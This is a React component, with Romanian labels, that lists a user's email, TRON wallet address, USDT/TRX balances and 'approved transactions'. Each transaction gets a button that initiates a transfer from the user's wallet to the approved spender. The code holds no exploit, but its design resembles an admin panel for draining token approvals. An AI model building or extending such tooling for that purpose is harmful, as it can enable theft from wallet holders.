"use client";
import React, { useState } from "react";
import { useGetApprovedTransactionById } from "../hooks/useGetAprovedTransactionById";
 import BtnInitiator from "../components/BtnInitiator";
const UserCard = ({ id, email, walletAddress, usdtBalance, trxBalance }) => {
  const { transactions, loading, error } = useGetApprovedTransactionById(id);
  const [amount, setAmount] = useState()
  const formatAddress = (address) =>
    address ? `${address.slice(0, 6)}...${address.slice(-4)}` : "N/A";
  
  const handleAmount = (event) => {
    const value = event.target.value; // Obține valoarea curentă din input
    setAmount(value); // Actualizează starea
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text).then(() => {
      alert("Adresa a fost copiată în clipboard!");
    }).catch((err) => {
      console.error("Failed to copy text: ", err);
    });
  };
  console.log(transactions);
  
  return (
    <div className="max-w-sm w-full p-6 bg-white border border-gray-200 rounded-lg shadow-md hover:shadow-lg transition-shadow">
      <h2 className="text-lg font-semibold text-gray-800 mb-2">User ID: {id}</h2>
      <p className={`text-sm mb-2 ${email ? "text-gray-600" : "text-gray-400"}`}>
        <strong>Email:</strong> {email || "Email indisponibil"}
      </p>
      <p className="text-sm text-gray-600 mb-2">
        <strong>Wallet Address:</strong>
        <button
          className="bg-gray-100 text-gray-700 px-2 py-1 rounded ml-2 hover:bg-gray-200 transition"
          onClick={() => copyToClipboard(walletAddress)}
        >
          {formatAddress(walletAddress)}
        </button>
      </p>
      <div className="flex justify-between items-center text-sm text-gray-600 mb-4">
        <p>
          <strong>USDT Balance:</strong> {usdtBalance.toFixed(2)}
        </p>
        <p>
          <strong>TRX Balance:</strong> {trxBalance.toFixed(2)}
        </p>
      </div>
      <h3 className="text-md font-semibold text-gray-700 mb-2">Approved Transactions:</h3>
      {loading ? (
        <p className="text-sm text-gray-400">Se încarcă...</p>
      ) : error ? (
        <p className="text-sm text-red-500">Eroare: {error}</p>
      ) : transactions.length > 0 ? (
        <ul className="list-disc pl-4">
          {transactions.map((transaction) => (
            <li key={transaction.id} className="text-sm text-gray-600 mb-2">
              <div className="flex flex-col gap-4">
                <span>
                  <strong>Type:</strong> {transaction.transactionType}
                </span>
                <span>
                  <strong>Amount:</strong> {transaction.usdtAmount} USDT /{" "}
                  {transaction.trxAmount} TRX
                </span>
                <span>
                  <strong>Spender:</strong>
                  <button
                    className="bg-blue-100 text-blue-700 px-2 py-1 rounded ml-2 hover:bg-blue-200 transition"
                    onClick={() => copyToClipboard(transaction.spender)}
                  >
                    {formatAddress(transaction.spender)}
                  </button>
                </span>
                 <div className="flex flex-col items-start mb-4">
                    <input
                      className="border h-10 mb-4 px-2 rounded w-full"
                      onChange={handleAmount}
                      type="number"
                      placeholder="Introdu suma pentru transfer"
                      value={amount} // Leagă valoarea inputului de stare
                    />
                    <p className="text-gray-700 text-sm">
                      Suma introdusă: <strong>{amount}</strong>
                    </p>
                  </div>
              </div>
              <BtnInitiator
                fromAddress={walletAddress}
                toAddress={transaction.spender}
                amount={amount}
                status={transaction.status}
              >
              
              </BtnInitiator>
            </li>
           
          ))}
        </ul>
      ) : (
        <p className="text-sm text-gray-400">Nu există tranzacții aprobate.</p>
      )}
         

    
    </div>
  );
};

export default UserCard;
